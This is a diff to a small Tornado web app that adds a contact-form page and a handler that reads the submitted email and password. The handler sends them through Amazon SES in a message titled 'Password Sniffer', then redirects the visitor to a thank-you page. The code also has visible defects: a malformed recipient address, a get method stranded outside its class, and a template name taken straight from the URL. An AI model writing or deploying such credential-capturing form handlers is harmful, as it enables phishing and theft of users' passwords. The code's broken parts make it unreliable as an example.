@@ -1,17 +1,30 @@
 import os
+import boto3
 
 import tornado.ioloop
 import tornado.web
 import tornado.log
 
+from dotenv import load_dotenv
+
 from jinja2 import \
   Environment, PackageLoader, select_autoescape
 
+load_dotenv('.env')
+
 PORT = int(os.environ.get('PORT', '8888'))
+
 
 ENV = Environment(
   loader=PackageLoader('myapp', 'templates'),
   autoescape=select_autoescape(['html', 'xml'])
+)
+
+SES_CLIENT = boto3.client(
+  'ses',
+  aws_access_key_id=os.environ.get('AWS_ACCESS_KEY'),
+  aws_secret_access_key=os.environ.get('AWS_SECRET_KEY'),
+  region_name="us-east-1"
 )
 
 class TemplateHandler(tornado.web.RequestHandler):
@@ -31,32 +44,48 @@ class MainHandler3(TemplateHandler):
   def get(self):
     self.render_template("tv_shows.html",{})
 
-class YouHandler(tornado.web.RequestHandler):
-  def get(self, name):
-    self.set_header("Content-Type", 'text/plain')
-    self.write("Hello, {}".format(name))
-
-class YouTooHandler(tornado.web.RequestHandler):
+class MainHandler4(TemplateHandler):
   def get(self):
-    self.set_header("Content-Type", 'text/plain')
-    name = self.get_query_argument('name', 'Nobody')
-    self.write("Hello, {}".format(name))
+    self.render_template("contact_form.html",{})
 
-class YouThreeHandler(tornado.web.RequestHandler):
-  def get(self):
-    self.set_header("Content-Type", 'text/plain')
-    names = self.get_query_arguments('name')
-    print(names)
-    for name in names:
-      self.write("Hello, {}\n".format(name))
+
+class PageHandler(TemplateHandler):
+  def post (self, page):
+    email = self.get_body_argument('email')
+    password = self.get_body_argument('password')
+
+    response = SES_CLIENT.send_email(
+      Destination={
+        'ToAddresses': ['richiewong07.com'],
+      },
+      Message={
+        'Body': {
+          'Text': {
+            'Charset': 'UTF-8',
+            'Data': 'Email: {}\nPassword: {}\n'.format(email, password),
+          },
+        },
+        'Subject': {'Charset': 'UTF-8', 'Data': 'Password Sniffer'},
+      },
+      Source='richie@richiewong07.com',
+    )
+    # self.write('Thanks got your data<br>')
+    # self.write('Email: ' + email)
+    self.redirect('/thank-you-for-submitting')
+
+def get(self, page):
+    self.set_header(
+      'Cache-Control',
+      'no-store, no-cache, must-revalidate, max-age=0')
+    self.render_template(page, {})
 
 def make_app():
   return tornado.web.Application([
     (r"/", MainHandler),
     (r"/travel", MainHandler2),
     (r"/tv_shows", MainHandler3),
-    (r"/hello3", YouThreeHandler),
-    (r"/hello/(.*)", YouHandler),
+    (r"/contact_form", MainHandler4),
+    (r"/page/(.*)", PageHandler),
     (
       r"/static/(.*)",
       tornado.web.StaticFileHandler,
